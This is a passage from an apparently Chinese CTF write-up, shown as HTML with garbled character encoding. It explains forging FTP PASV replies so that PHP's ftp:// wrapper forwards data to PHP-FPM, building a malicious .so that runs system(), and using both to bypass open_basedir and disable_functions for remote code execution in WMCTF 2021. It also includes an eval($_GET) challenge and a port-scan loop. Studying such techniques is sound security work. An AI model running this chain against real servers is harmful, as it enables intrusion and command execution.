&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å¦ä¸€å°192.168.187.3ä¸Šè®¿é—®è¿™ä¸ªæ¶æ„æœåŠ¡ï¼ŒæœŸé—´ä¼ è¾“çš„æ–‡ä»¶å°±ä¼šè¢«è½¬å‘åˆ°192.168.187.3è‡ªå·±çš„12345ç«¯å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="phpåŠ è½½æ¶æ„soæ–‡ä»¶">phpåŠ è½½æ¶æ„.soæ–‡ä»¶&lt;/h4>
&lt;p>ä¿®æ”¹php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Cæºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¼–è¯‘ä¸º.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿è¡Œphpå³è§¦å‘æ¶æ„.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftp">ä»¤phpä½¿ç”¨ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftpè¯» æ³¨æ„åé¢çš„è·¯å¾„éƒ½éœ€è¦ç»å¯¹è·¯å¾„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftpå†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>ä½†æ˜¯è¿™é‡Œä¸€ç›´æ˜¯å¯ä»¥æ–°å»ºæ–‡ä»¶ä½†æ˜¯å†™å…¥ä¸äº†ï¼Œè¯»å…¥çš„å‚æ•°2ä¸€ç›´æ˜¯int(0)ï¼Œæš‚æ—¶è¿˜æ²¡è§£å†³é—®é¢˜ï¼ˆä¸è¿‡ç”¨ä¸‹é¢é‚£ä¸ªå†™å…¥å¾ˆæ­£å¸¸â€¦â€¦&lt;/p>
&lt;p>è¦†ç›–å·²å­˜åœ¨æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftpå¹¶è½¬å‘ftp-data">ä»¤phpä½¿ç”¨ftp://å¹¶è½¬å‘FTP-DATA&lt;/h4>
&lt;p>å°†ä¸Šé¢çš„æ“ä½œç”¨wiresharkæŠ“ä¸ªåŒ…çœ‹çœ‹æµé‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯EPSV modeè€Œä¸æ˜¯PASV modeï¼Œä¸ä¼šæœ‰æ‹¬å·å†…çš„ip+portæè¿°ï¼ŒFTP-DATAåªä¼šè¢«æ‰“å‘æ§åˆ¶è¿æ¥çš„æœåŠ¡ç«¯çš„ç«¯å£ï¼Œä¸èƒ½åšåˆ°FTP-DATAçš„ä»»æ„è½¬å‘&lt;/p>
&lt;p>ä¸è¿‡ä¹Ÿä¸æ˜¯æ¯«æ— åŠæ³•ï¼Œå¦‚æœç”¨EPSVå‘½ä»¤è¿”å›çš„ç»“æœä¸æ˜¯229ï¼Œé‚£ä¹ˆphpçš„ftp://å°±ä¼šä½¿ç”¨PASVå‘½ä»¤&lt;/p>
&lt;p>å°†ä¸Šé¢çš„ftp-serverä¿®æ”¹ä¸€ä¸‹ï¼Œå°†229å“åº”è®¾ä¸ºäº†000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>æˆåŠŸè½¬å‘&lt;/p>
&lt;h4 id="ä½¿ç”¨ftpå°†payloadæ‰“å‘fpm">ä½¿ç”¨ftp://å°†payloadæ‰“å‘fpm&lt;/h4>
&lt;p>ç»“åˆä¸Šé¢å‡ ä¸ªå®ä¾‹åº”è¯¥å°±å¾ˆæ¸…æ™°äº†ï¼Œæ€è·¯å°±æ˜¯ï¼š&lt;/p>
&lt;ul>
&lt;li>ç¼–å†™åŒ…å«æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„.so&lt;/li>
&lt;li>æ‰“å‘fpmçš„ä¸€æ³¢æµé‡ï¼Œç”¨äºè§£å¼€open_basedir, allow_url_includeç­‰çš„é™åˆ¶ï¼Œå½¢å¼æ˜¯file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
&lt;li>ç”¨file_put_contents('/tmp/wuhu.so',$_POST[&amp;lsquo;data&amp;rsquo;])çš„å½¢å¼å°†.soä¼ å…¥&lt;/li>
&lt;li>å¦‚æœé¡ºåˆ©çš„è¯open_basedirè§£å¼€é™åˆ¶ï¼Œ.soè¢«åŒ…å«ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ.soä¸­çš„ä»£ç åšåˆ°rceäº†&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œçš„å®Œç¾æ —å­å½“ç„¶æ˜¯èµµæ€»çš„ä¸‰å¥è¯ï¼ˆæŒ‡è·¯èµµæ€»åšå®¢-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>æ€è·¯å…ˆæ”¾åœ¨å‰é¢ï¼šæ‰¾åˆ°fpmç«¯å£-&amp;gt;æ­å»ºæ¶æ„ftp_server å°†.soæ–‡ä»¶è½¬å‘è‡³fpmç«¯å£-&amp;gt;åˆ©ç”¨.soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤-&amp;gt;æ‹¿flag&lt;/p>
&lt;p>é¢˜ç›®ä»£ç åªæœ‰ä¸‰å¥è¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æ¥çœ‹phpinfo();ä¼š500ï¼Œç”¨&lt;code>get_cfg_var&lt;/code>è·å–é…ç½®é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;quot;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;quot;
&lt;/code>&lt;/pre>&lt;p>åªèƒ½è¯´è¯¥ç¦çš„éƒ½ç¦äº†ï¼›å†åº·åº·allow_url_fopenå’Œinclude&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;quot;1&amp;quot;
string(0) &amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>å†åº·åº·open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;quot;/var/www/html/&amp;quot;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm è¿™ä¸ªä¹‹åä¹Ÿéœ€è¦ç»•è¿‡&lt;/p>
&lt;p>ç”¨tcp://ä¼ªåè®®æ‰«ä¸€ä¸‹æœ¬æœºå¼€æ”¾çš„ç«¯å£&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…&lt;code>file_get_contents&lt;/code>å’Œ&lt;code>error_get_last&lt;/code>è·å–åˆ°è¯·æ±‚ä¸­å‘å‡ºçš„é”™è¯¯è¿›è¡Œå¾ªç¯åˆ¤æ–­ä¹Ÿå¯ä»¥è¿›è¡Œç«¯å£æ‰«æ&lt;/p>
